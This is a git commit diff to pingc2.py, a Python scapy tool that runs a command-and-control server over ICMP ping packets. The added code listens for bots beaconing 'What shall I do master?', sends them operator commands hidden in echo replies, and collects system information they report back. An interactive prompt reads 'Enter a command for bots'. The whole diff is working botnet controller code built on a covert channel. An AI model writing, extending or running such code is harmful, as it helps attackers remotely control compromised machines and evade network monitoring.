15b6d87b3f7e6bcefe5483bd4fa965f7a8b39c0e
nocow4bob <robert.ant.davis@gmail.com>
2013-06-29 17:46:18 +0000

    added threaded sniffer and clean process kill

--- pingc2.py
+++ pingc2.py
@@ -6,6 +6,8 @@
 #  and listen for the data payload of "What shall I do master?". If this data is received,
 #  a command is sent to the client. Command must start with "run"
 
+import thread
+import threading
 import sys
 import signal
 from scapy.all import *
@@ -15,15 +17,52 @@ def handler(signum, frame):
 	print 'Bye!'
 	sys.exit()
 
+# Command and Control main function
+def c2main(command):
+	conf.verb = 0
+        count = 1
+        filter = "icmp"
+        print "[*] Sniffing with filter (%s) for %d bytes" % (filter, int(count))
+
+        while True:
+                packet = sniff(count,filter=filter)
+                for p in packet:
+                        #p.show2()
+                        try:
+                                request = p['Raw'].load
+                                ip_id = p['IP'].id
+                                icmp_id = p['ICMP'].id
+                                print "[*] Request: " + request
+                                if request == 'What shall I do master?':
+                                        resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
+                                        print "[*] Response sent: " + sys.argv[1]
+                                        #resp.show2()
+                                        send(resp)
+                                elif 'sysinfo' in request:
+                                        sysinfo = request[8:]
+                                        print "[*] Received sysinfo from client: %s" % sysinfo
+                                        resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
+                                        #resp.show2()
+                                        print "[*] Response sent: Thanks"
+                                        send(resp)      
+                                else:   
+                                        print "[**] Client not recognized"
+                        except:
+                                print "[X] ERROR: ", sys.exc_info()[0]
 
 def main(argv):
-	if len(argv) < 1:
-                print "----------------------------"
-                print "PingC2 Usage"
-                print " ./pingc2.py <command>"
-                print "----------------------------"
-                exit()
-	
+	#if len(argv) < 1:
+        #        print "----------------------------"
+        #        print "PingC2 Usage"
+        #        print " ./pingc2.py <command>"
+        #        print "----------------------------"
+        #        exit()
+	while True:
+		signal.signal(signal.SIGINT, handler)
+		command = raw_input("Enter a command for bots: ")
+		processThread = threading.Thread(target=c2main, args=([command]))
+		processThread.daemon = True
+		processThread.start()	
 	conf.verb = 0
 	count = 1
 	filter = "icmp"
